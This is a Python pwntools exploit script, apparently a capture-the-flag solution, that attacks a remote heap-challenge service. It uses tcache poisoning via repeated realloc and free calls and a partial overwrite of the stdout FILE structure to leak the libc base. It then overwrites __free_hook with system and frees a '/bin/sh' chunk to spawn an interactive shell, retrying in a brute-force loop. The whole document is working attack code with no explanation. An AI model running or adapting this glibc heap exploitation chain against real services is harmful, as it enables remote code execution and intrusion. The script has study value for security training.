from pwn import *

libc = ELF('../../libc/1864')
context.arch = 'amd64'
r = remote('node3.buuoj.cn', 27314)


def realloc(size, content):
    r.recvuntil('>> ')
    r.send('1')
    r.recvline()
    r.send(str(size))
    r.recvline()
    r.send(content)


def free():
    r.recvuntil('>> ')
    r.send('2')


def freezero():
    r.recvuntil('>> ')
    r.send('666')


def pwn():
    realloc(0x10, 'da')
    realloc(0, '')
    realloc(0x80, 'da')
    realloc(0, '')
    realloc(0x20, 'da')
    realloc(0, '')

    realloc(0x80, 'da')
    for i in range(7):
        free()
    realloc(0, '')

    realloc(0x10, 'da')
    realloc(0xA0, 'a' * 0x10 + flat([0, 0x41]) + p16((0x6 << 0xC) + (libc.sym['_IO_2_1_stdout_'] & 0xFFF)))
    realloc(0, '')
    realloc(0x80, 'da')
    realloc(0, '')
    realloc(0x80, flat([0xFBAD1887, 0, 0, 0]) + p8(0x58))
    libc_base = u64(r.recv(6).ljust(8, '\x00')) - 0x3E82A0
    if libc_base & 0x7F << 0x28 != 0x7F << 0x28:
        raise EOFError
    free_hook_addr = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    freezero()
    realloc(0x40, 'da')
    realloc(0, '')
    realloc(0x90, 'da')
    realloc(0, '')
    realloc(0x50, 'da')
    realloc(0, '')
    realloc(0x90, 'da')
    for i in range(7):
        free()
    realloc(0, '')
    realloc(0x40, 'da')
    realloc(0xE0, 'a' * 0x40 + flat([0, 0x41, free_hook_addr - 0x8]))
    realloc(0, '')
    realloc(0x90, 'da')
    realloc(0, '')
    realloc(0x90, '/bin/sh\x00' + p64(system_addr))
    free()
    r.interactive()


while True:
    try:
        pwn()
        quit()
    except EOFError:
        r.close()
        r = remote('node3.buuoj.cn', 27314)
        continue
